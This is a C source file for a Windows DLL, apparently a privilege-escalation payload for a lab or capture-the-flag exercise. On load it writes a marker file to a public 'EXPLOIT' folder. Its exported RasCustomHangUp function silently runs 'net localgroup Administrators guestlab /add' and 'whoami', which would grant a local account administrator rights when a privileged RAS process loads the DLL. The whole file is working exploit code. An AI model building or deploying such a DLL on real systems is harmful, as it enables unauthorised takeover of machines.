#include <windows.h>

#ifndef HELPER_USER
#define HELPER_USER "guestlab"
#endif

static void write_text_file(const wchar_t* path, const char* text) {
    HANDLE handle = CreateFileW(
        path,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (handle == INVALID_HANDLE_VALUE) {
        return;
    }

    DWORD written = 0;
    WriteFile(handle, text, (DWORD)lstrlenA(text), &written, NULL);
    CloseHandle(handle);
}

BOOL WINAPI DllMain(HINSTANCE instance, DWORD reason, LPVOID reserved) {
    (void)instance;
    (void)reserved;
    if (reason != DLL_PROCESS_ATTACH) {
        return TRUE;
    }

    write_text_file(L"C:\\Users\\Public\\Desktop\\EXPLOIT\\load.txt", "loaded\r\n");
    return TRUE;
}

__declspec(dllexport)
DWORD WINAPI RasCustomHangUp(void* hconn) {
    (void)hconn;
    WinExec(
        "cmd /c net localgroup Administrators " HELPER_USER " /add > "
        "C:\\Users\\Public\\Desktop\\EXPLOIT\\group_add.txt 2>&1 && "
        "whoami > C:\\Users\\Public\\Desktop\\EXPLOIT\\system.txt",
        SW_HIDE
    );
    return 0;
}
